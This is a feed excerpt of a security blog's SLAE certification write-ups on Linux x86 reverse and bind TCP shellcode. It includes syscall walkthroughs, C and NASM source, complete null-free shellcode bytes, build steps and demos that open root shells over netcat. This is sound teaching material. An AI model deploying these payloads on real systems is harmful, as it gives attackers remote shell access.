\x31\xc0\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x93\x66\xb8\x6a\x01\x68\x7f\x01\x01\x01\x66\x68\x10\x92\x66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x99\x50\x6a\x0b\x58\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
cc -DSHELLCODE=`asm-opcodes reverse` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</code></pre>

<pre><code class="bash">$ nc -lv 127.1.1.1 4242
Listening on [127.1.1.1] (family 0, port 4242)
Connection from localhost 38844 received!
id
uid=0(root) gid=0(root) groups=0(root)
# ./shellcode
Shellcode length: 70
</code></pre>

<pre><code class="bash"># make strace
Shellcode length: 70
# head -n35 reverse.strace
execve("./shellcode", ["./shellcode"], [/* 24 vars */]) = 0
write(1, "Shellcode length: 70\n", 21)  = 21
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(4242), sin_addr=inet_addr("127.1.1.1")}, 16) = 0
dup2(3, 2)                              = 2
dup2(3, 1)                              = 1
dup2(3, 0)                              = 0
execve("//bin/sh", NULL, NULL)          = 0
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x01: Bind TCP Shell]]></title>
    <link href="http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell/"/>
    <updated>2018-05-20T21:51:39+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> these are also available as system calls since Linux version 4.3.</p>

<p>I&rsquo;ve also decided not to call <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> to reuse the port and relied on some implementation-specific behaviour to keep the shellcode smaller.</p>

<p>To perform a network I/O operation a process needs to first call <a href="http://man7.org/linux/man-pages/man2/socket.2.html">socket(2)</a> by specifying the desired protocol and to obtain a file descriptor:</p>

<pre><code class="c socket(2) prototype">int socket(int domain, int type, int protocol);
</code></pre>

<p>The domain (also known as family) is implementation-defined, but most of the time it is one of:</p>

<pre><code>+----------+-------------+
|  domain  | description |
+----------+-------------+
| AF_INET  | IPv4        |
| AF_INET6 | IPv6        |
| AF_LOCAL | Unix domain |
+----------+-------------+
</code></pre>

<p>The type specifies the semantics of the communication:</p>

<pre><code>+-------------+-----------------+
|    type     |   description   |
+-------------+-----------------+
| SOCK_STREAM | Stream socket   |
| SOCK_DGRAM  | Datagram socket |
+-------------+-----------------+
</code></pre>

<p>The protocol can be set to zero to select the default one for the combination of domain and type:</p>

<pre><code>+--------------+-----------------+
|   protocol   |   description   |
+--------------+-----------------+
| IPPROTO_TCP  | TCP transport   |
| IPPROTO_UDP  | UDP transport   |
| IPPROTO_SCTP | SCTP transport  |
+--------------+-----------------+
</code></pre>

<pre><code class="bash retrieving the system call number and constants">$ asm-syscall socket
#define __NR_socket 359
0x167
$ python -c 'import socket; print socket.AF_INET; print socket.SOCK_STREAM'
2
1
</code></pre>

<p>With this in mind the registers will contain the following before and after the system call:</p>

<pre><code>+----------+-------+
| register | value |
+----------+-------+
| eax      | 359   |
| ebx      | 2     |
| ecx      | 1     |
| edx      | 0     |
+----------+-------+
| return   | fd    |
+----------+-------+
</code></pre>

<p>The bind shell will use the AF_INET family with a SOCK_STREAM type. Beware that not all combinations of family and type are valid. Then, one needs to use <a href="http://man7.org/linux/man-pages/man2/bind.2.html">bind(2)</a> to assign a local protocol address to the socket:</p>

<pre><code class="c bind(2) prototype">int bind(int sockfd, const struct sockaddr *addr, socklen_t addr_len);
</code></pre>

<p>The socket address structure, in this case, has to be manually packed and will be IPv4 specific. Nowadays, one should use <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">getaddrinfo(3)</a> and sockaddr_storage which is large enough for any socket structure, instead:</p>

<pre><code class="c">#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;

#include &lt;err.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

int
bind_try(struct addrinfo *p)
{
    int fd, yes = 1;

    if ((fd = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol)) == -1) {
        warn("socket");
        return (-1);
    }
    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof yes) == -1)
        err(1, "setsockopt");
    if (bind(fd, p-&gt;ai_addr, p-&gt;ai_addrlen) == -1) {
        close(fd);
        warn("bind");
        return (-1);
    }

    return (fd);
}

int
main(int argc, char **argv)
{
    char                    *exec_argv[] = { "/bin/sh", NULL };
    int                      ai_ret, fd, fd_client;
    socklen_t                sl_client;
    struct addrinfo          ai_hints;
    struct addrinfo         *ai_ptr, *ai_srv;
    struct sockaddr_storage  sa_client;

    if (argc != 2)
        errx(1, "usage: port");

    memset(&amp;ai_hints, 0, sizeof ai_hints);
    ai_hints.ai_family = AF_UNSPEC;
    ai_hints.ai_socktype = SOCK_STREAM;
    ai_hints.ai_flags = AI_PASSIVE;

    if ((ai_ret = getaddrinfo(NULL, argv[1], &amp;ai_hints, &amp;ai_srv)) != 0)
        errx(1, "getaddrinfo: %s", gai_strerror(ai_ret));
    for (ai_ptr = ai_srv; ai_ptr != NULL; ai_ptr = ai_ptr-&gt;ai_next) {
        if ((fd = bind_try(ai_ptr)) != -1)
            break;
    }
    if (ai_ptr == NULL)
        errx(1, "failed to bind");
    freeaddrinfo(ai_srv);
    sl_client = sizeof sa_client; 

    if (listen(fd, 5) == 1)
        err(1, "listen");
    fd_client = accept(fd, (struct sockaddr *) &amp;sa_client, &amp;sl_client);
    if (fd_client == -1)
        err(1, "accept");

    if (dup2(fd_client, STDIN_FILENO) == -1)
        err(1, "dup2");
    if (dup2(fd_client, STDOUT_FILENO) == -1)
        err(1, "dup2");
    if (dup2(fd_client, STDERR_FILENO) == -1)
        err(1, "dup2");

    execve(exec_argv[0], exec_argv, NULL);
    err(1, "execve");

    return (0); /* NOTREACHED */
}
</code></pre>

<p>Per the UNP book, it isn&rsquo;t mandatory to choose a port nor an address to bind to. In that case, the kernel picks an ephemeral port and uses the destination IP address of the client&rsquo;s SYN as the server&rsquo;s source IP address.</p>

<pre><code class="c IPv4 socket structure">struct in_addr {
    in_addr_t s_addr;        /* 32-bit IPv4 address */
}; /* used to be a union on 4.2BSD */

struct sockaddr_in {
    sa_family_t sin_family;  /* 16-bit family (AF_INET) */
    in_port_t sin_port;      /* 16-bit port number */
    struct in_addr sin_addr; /* 32-bit address */
    char sin_zero[8];        /* unused */
};
</code></pre>

<pre><code class="c generic socket structure">struct sockaddr {
    unsigned short sa_family; /* address family, AF_xxx */
    char sa_data[14];         /* 14 bytes of protocol address */
}; 
</code></pre>

<p>According to <a href="http://www.kohala.com/start/">Stevens</a>, the sin_zero member was added so that all socket address structures are at least 16 bytes in size and isn&rsquo;t really required when it is going to be used with the wildcard address.</p>

<p>The socket structures are casted to the generic socket address structure, due to the functions having to deal with a multitude of protocol families (IPv4, IPv6, Unix and datalink, for instance). One could have used void from ANSI C instead of the generic structure, however that was non-existent back in 1982.</p>

<pre><code class="c IPv6 socket structure">struct in6_addr {
    uint8_t s6_addr[16];       /* 128-bit IPv6 address */
};

struct sockaddr_in6 {
    sa_family_t sin6_family;   /* 16-bit family (AF_INET6) */
    in_port_t sin6_port;       /* 16-bit port number */
    uint32_t sin6_flowinfo;    /* 32-bit flow information */
    struct in6_addr sin6_addr; /* 128-bit address */
    uint32_t sin6_scope_id;    /* 32-bit scope ID */
};
</code></pre>

<p>The important part here is that the family struct members match, so that it can be freely accessed when casted to the generic socket structure.</p>

<pre><code class="bash retrieving the system call number and constants">$ asm-syscall bind
#define __NR_bind 361
0x169
$ python -c 'import socket; print socket.INADDR_ANY'
0
</code></pre>

<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 361                |      +---------------------------+ H
| ebx      | socket(2) fd       |      | INADDR_ANY (0)            |
| ecx      | esp pointer        +--&gt;&gt;--+ port (network byte order) |
| edx      | 16                 |      | AF_INET (2)               |
+----------+--------------------+      +---------------------------+ L
</code></pre>

<p>This is the point where <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> could be used to prevent the address is already in use error, which might occur if there are still previously established connections lying around.</p>

<p>For the <a href="http://man7.org/linux/man-pages/man2/listen.2.html">listen(2)</a> system call, according to <a href="http://pubs.opengroup.org/onlinepubs/9699919799/">SUSv4</a> a backlog argument of 0 may allow the socket to accept connections, in which case the length of the listen queue may be set to an implementation-defined minimum value. This works if SYN cookies are <a href="https://access.redhat.com/solutions/30453">enabled</a>, which is usually the case with recent versions.</p>

<pre><code class="c listen(2) prototype">int listen(int sockfd, int backlog);
</code></pre>

<pre><code class="bash retrieving the system call number">$ asm-syscall listen
#define __NR_listen 363
0x16b
</code></pre>

<pre><code>+----------+---------------+
| register |     value     |
+----------+---------------+
| eax      | 363           |
| ebx      | socket(2) fd  |
| ecx      | 0             |
+----------+---------------+
</code></pre>

<p>Next and finally in the flow is the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept4(2)</a> call which is used to return a completed connection from the queue, if any. On success the return value is a new file descriptor created by the kernel to be used with the recently established connection:</p>

<pre><code class="c accept4(2) prototype">int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
</code></pre>

<p>The second and third arguments are used by the kernel to fill the address structure of the newly connected peer. According to the manual page these aren&rsquo;t really needed and can be both NULL.</p>

<pre><code>+----------+---------------+
| register |     value     |
+----------+---------------+
| eax      | 364           |
| ebx      | socket(2) fd  |
| ecx      | 0             |
| edx      | 0             |
| esi      | 0             |
+----------+---------------+
| return   | new fd        |
+----------+---------------+
</code></pre>

<p>For the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call there&rsquo;s no need to specify argv and envp, since according to the manual page on Linux, argv and envp can be specified as NULL. This is obviously <a href="http://pubs.opengroup.org/onlinepubs/9699919799/">non-standard</a> and might result in an error on other systems.</p>

<pre><code class="c execve(2) prototype">int execve(const char *filename, char *const argv[], char *const envp[]);
</code></pre>

<pre><code class="bash retrieving the system call number">$ asm-syscall execve
#define __NR_execve 11
0xb
</code></pre>

<pre><code>+----------+-------------+
| register |    value    |
+----------+-------------+
| eax      | 11          |      +-----------+
| ebx      | esp pointer +--&gt;&gt;--+ /bin/sh\0 |
| ecx      | 0           |      +-----------+
| edx      | 0           |
+----------+-------------+
</code></pre>

<pre><code class="bash converting path to hex and little endian">$ asm-string /bin/sh
Adding 1 slashes!
Original string: /bin/sh (7)
Modified string: //bin/sh (8)
0x68732f6e
0x69622f2f
</code></pre>

<pre><code class="asm initial execve(2) shellcode">; Regular execve(2) /bin/sh shellcode that tries to save as much space possible
; and follow the specification.

global _start

section .text
_start:
    xor eax, eax

    push eax
    mov edx, esp    ; envp
    push 0x68732f6e ; n/sh
    push 0x69622f2f ; //bi
    mov ebx, esp    ; filename

    push eax
    push ebx
    mov ecx, esp    ; argv

    mov al, 0xb
    int 0x80
</code></pre>

<pre><code class="bash">$ asm-opcodes execve
Shellcode size: 25
\x31\xc0\x50\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
$ strace ./execve    
execve("./execve", ["./execve"], [/* 19 vars */]) = 0    
execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0
</code></pre>

<p>Not specifying those arguments allows saving 4 bytes:</p>

<pre><code class="asm second version of execve(2) shellcode">; Save space by making the second argument to execve(2) empty. This doesn't
; strictly follow POSIX or SUS.

global _start

section .text
_start:
    xor ecx, ecx    ; argv
    mul ecx         ; makes eax and edx (envp) zero

    push eax
    push 0x68732f6e ; n/sh
    push 0x69622f2f ; //bi
    mov ebx, esp    ; filename

    mov al, 0xb
    int 0x80
</code></pre>

<pre><code class="bash">$ asm-opcodes execve
Shellcode size: 21
\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80
$ strace ./execve
execve("./execve", ["./execve"], [/* 19 vars */]) = 0
execve("//bin/sh", NULL, NULL)
</code></pre>

<p>The standard input, output and error file descriptors need to be redirected with <a href="http://man7.org/linux/man-pages/man2/dup.2.html">dup2(2)</a> beforehand to the recently <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept4(2)</a> file descriptor in order to have interaction with the created shell.</p>

<pre><code class="c dup2(2) prototype">int dup2(int fildes, int fildes2);
</code></pre>

<pre><code class="bash retrieving the system call number">$ asm-syscall dup2
#define __NR_dup2 63
0x3f
</code></pre>

<pre><code>+----------+---------------+
| register |     value     |
+----------+---------------+
| eax      | 63            |
| ebx      | accept4(2) fd |
| ecx      | 2, 1, 0       |
+----------+---------------+
| return   | 2, 1, 0       |
+----------+---------------+
</code></pre>

<p>In C, overall, this roughly translates to:</p>

<pre><code class="c">#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;

#include &lt;arpa/inet.h&gt;

#include &lt;err.h&gt;
#include &lt;errno.h&gt;
#include &lt;limits.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;strings.h&gt;
#include &lt;unistd.h&gt;

int
main(int argc, char **argv)
{
    char                    *exec_argv[] = { "/bin/sh", NULL };
    char                    *endptr;
    int                      fd, fd_client, yes = 1;
    long                     port;
    socklen_t                sl_client;
    struct sockaddr_in       sa;
    struct sockaddr_storage  sa_client;

    if (argc == 1)
        errx(1, "usage: port");

    errno = 0;
    port = strtol(argv[1], &amp;endptr, 10);
    if (*endptr != '\0')
        errx(1, "not a number");
    if (errno == ERANGE || (port &lt;= 1024 || port &gt;= 65536))
        errx(1, "port out of range");

    if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
        err(1, "socket");

    bzero(&amp;sa, sizeof sa);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    sa.sin_port = htons(port);

    if (bind(fd, (struct sockaddr *) &amp;sa, sizeof sa) == -1)
        err(1, "bind");
    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof yes) == -1)
        err(1, "setsockopt");
    if (listen(fd, 5) == -1)
        err(1, "listen");

    sl_client = sizeof sa_client; 
    fd_client = accept(fd, (struct sockaddr *) &amp;sa_client, &amp;sl_client);
    if (fd_client == -1)
        err(1, "accept");

    if (dup2(fd_client, STDIN_FILENO) == -1)
        err(1, "dup2");
    if (dup2(fd_client, STDOUT_FILENO) == -1)
        err(1, "dup2");
    if (dup2(fd_client, STDERR_FILENO) == -1)
        err(1, "dup2");

    execve(exec_argv[0], exec_argv, NULL);
    err(1, "execve");

    return (0); /* NOTREACHED */
}
</code></pre>

<p>And, finally, the commented shellcode:</p>

<pre><code class="asm">global _start

section .text
_start:
    xor eax, eax
    xor esi, esi            ; will always hold the value 0
    cdq                     ; set edx to zero as well, by sign extending eax

    mov ax, 0x167           ; use mov instead of push imm16 and pop r16
    ; int socket(int, int, int)
    push 0x2                ; PF_INET
    pop ebx                 ; domain
    push 0x1                ; SOCK_STREAM
    pop ecx                 ; type
    ; edx (protocol) initialized to zero by the cdq instruction above
    int 0x80

    xchg ebx, eax           ; fd on ebx from this point below
    mov ax, 0x169           ; use mov instead of push imm16 and pop r16
    ; int bind(int, const struct sockaddr *, socklen_t)
    push esi                ; INADDR_ANY
    push word PORT          ; port in network byte order
    push word 0x2           ; AF_INET
    mov ecx, esp            ; addr
    push 0x10               ; 16 bytes in total
    pop edx                 ; addrlen
    int 0x80

    mov ax, 0x16b           ; use mov instead of push imm16 and pop r16
    ; int listen(int, int)
    xor ecx, ecx            ; backlog
    int 0x80

    mul ecx                 ; set edx (addrlen) to zero
    mov ax, 0x16c           ; use mov instead of push imm16 and pop r16
    ; int accept4(int, struct sockaddr *, socklen_t *, int)
    ; ecx (addr) is already zero from the above listen(2)
    ; edx (addrlen) is already zero
    ; esi (flags) is already zero
    int 0x80

    xchg ebx, eax           ; fd
    inc ecx                 ; zero from the above listen(2)
    inc ecx                 ; newfd
bind_dup2_loop:
    push 0x3f
    ; int dup2(int, int)
    pop eax 
    int 0x80
    dec ecx
    jns bind_dup2_loop      ; don't jump if ecx is positive

    push eax                ; eax is zero from the dup2(2) above (stdin fd)
    mov al, 0xb
    ; int execve(const char *, char *const [], char *const [])
    push 0x68732f6e         ; n/sh
    push 0x69622f2f         ; //bi
    mov ebx, esp            ; filename
    inc ecx                 ; ecx (argv) is 0xffffffff from the above dup(2)
    ; edx is already zero from the above accept4(2)
    int 0x80
</code></pre>

<p>Running the shellcode is only a matter of configuring the desired listening port with the optional -l command-line argument (4242/tcp by default) and running make. This process also ensures that it is \x00 free and automatically compiles the usual C file that executes the shellcode:</p>

<pre><code class="bash">$ ./configure -l 1337
Using remote host: 0x0101017f
Using listening port: 0x3905
Using remote port: 0x9210
$ ./configure -l 1280
Port contains NUL bytes!
$ ./configure
Using remote host: 0x0101017f
Using listening port: 0x9210
Using remote port: 0x9210
$ cd 0x01-bind/
$ make
nasm  -f elf32 -o bind.o bind.asm
ld -N -zexecstack -o bind bind.o
08048060 &lt;_start&gt;:
 8048060:       31 c0                   xor    eax,eax
 8048062:       31 f6                   xor    esi,esi
 8048064:       99                      cdq
 8048065:       66 b8 67 01             mov    ax,0x167
 8048069:       6a 02                   push   0x2
 804806b:       5b                      pop    ebx
 804806c:       6a 01                   push   0x1
 804806e:       59                      pop    ecx
 804806f:       cd 80                   int    0x80
 8048071:       93                      xchg   ebx,eax
 8048072:       66 b8 69 01             mov    ax,0x169
 8048076:       56                      push   esi
 8048077:       66 68 10 92             pushw  0x9210
 804807b:       66 6a 02                pushw  0x2
 804807e:       89 e1                   mov    ecx,esp
 8048080:       6a 10                   push   0x10
 8048082:       5a                      pop    edx
 8048083:       cd 80                   int    0x80
 8048085:       66 b8 6b 01             mov    ax,0x16b
 8048089:       31 c9                   xor    ecx,ecx
 804808b:       cd 80                   int    0x80
 804808d:       f7 e1                   mul    ecx
 804808f:       66 b8 6c 01             mov    ax,0x16c
 8048093:       cd 80                   int    0x80
 8048095:       93                      xchg   ebx,eax
 8048096:       41                      inc    ecx
 8048097:       41                      inc    ecx

08048098 &lt;bind_dup2_loop&gt;:
 8048098:       6a 3f                   push   0x3f
 804809a:       58                      pop    eax
 804809b:       cd 80                   int    0x80
 804809d:       49                      dec    ecx
 804809e:       79 f8                   jns    8048098 &lt;bind_dup2_loop&gt;
 80480a0:       50                      push   eax
 80480a1:       b0 0b                   mov    al,0xb
 80480a3:       68 6e 2f 73 68          push   0x68732f6e
 80480a8:       68 2f 2f 62 69          push   0x69622f2f
 80480ad:       89 e3                   mov    ebx,esp
 80480af:       41                      inc    ecx
 80480b0:       cd 80                   int    0x80
Shellcode size: 82
\x31\xc0\x31\xf6\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x93\x66\xb8\x69\x01\x56\x66\x68\x10\x92\x66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\xf7\xe1\x66\xb8\x6c\x01\xcd\x80\x93\x41\x41\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
cc -DSHELLCODE=`asm-opcodes bind` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</code></pre>

<pre><code class="bash"># ./shellcode
Shellcode length: 82
$ ss -nlt|grep 4242
LISTEN     0      0            *:4242                     *:*
$ nc -v 127.0.0.1 4242
Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<pre><code class="bash"># make strace
$ head -n35 bind.strace
execve("./shellcode", ["./shellcode"], [/* 23 vars */]) = 0
write(1, "Shellcode length: 82\n", 21)  = 21
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(4242), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 0)                            = 0
accept4(3, NULL, NULL, 0)               = 4
dup2(4, 2)                              = 2
dup2(4, 1)                              = 1
dup2(4, 0)                              = 0
execve("//bin/sh", NULL, NULL)          = 0
</code></pre>

<p>Having the <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> call would result in an increase of <strong>16 bytes</strong>:</p>

<pre><code class="diff">--- ../../0x01-bind/bind.asm.in 2018-05-21 00:35:48.689635600 +0100
+++ setsockopt.asm      2018-05-21 00:41:40.340303200 +0100
@@ -1,9 +1,12 @@
+; Like the bind shell but with a call to setsockopt(2). Allows a server to bind
+; to a port even if there are previously established connections. Also useful
+; when there are multiple local aliased IP addresses listening on the same port.
+
 global _start

 section .text
 _start:
        xor eax, eax
-       xor esi, esi            ; will always hold the value 0
        cdq                     ; set edx to zero as well, by sign extending eax

        mov ax, 0x167           ; use mov instead of push imm16 and pop r16
@@ -15,7 +18,18 @@
        ; edx (protocol) initialized to zero by the cdq instruction above
        int 0x80

+       xchg edx, ebx           ; SO_REUSEADDR
        xchg ebx, eax           ; fd on ebx from this point below
+       mov ax, 0x16e           ; use mov instead of push imm16 and pop r16
+       ; int setsockopt(int, int, int, const void *, socklen_t)
+       ; ecx (level) is already 1 from the above socket(2) call
+       push 0x1                ; enabled
+       mov esi, esp            ; optval
+       push 0x4                ; 4 bytes
+       pop edi                 ; optlen
+       int 0x80
+
+       xor esi, esi            ; will always hold the value 0
        mov ax, 0x169           ; use mov instead of push imm16 and pop r16
        ; int bind(int, const struct sockaddr *, socklen_t)
        push esi                ; INADDR_ANY
</code></pre>

<pre><code class="bash">$ asm-compile setsockopt.asm
$ asm-opcodes setsockopt
Shellcode size: 98                      
\x31\xc0\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x87\xd3\x93\x66\xb8\x6e\x01\x6a\x01\x89\xe6\x6a\x04\x5f\xcd\x80\x31\xf6\x66\xb8\x69\x01\x56\x66\x68\x10\x92\x
66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\xf7\xe1\x66\xb8\x6c\x01\xcd\x80\x93\x41\x41\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x56\x68\x6e
\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
</code></pre>
]]></content>
  </entry>
  
</feed>
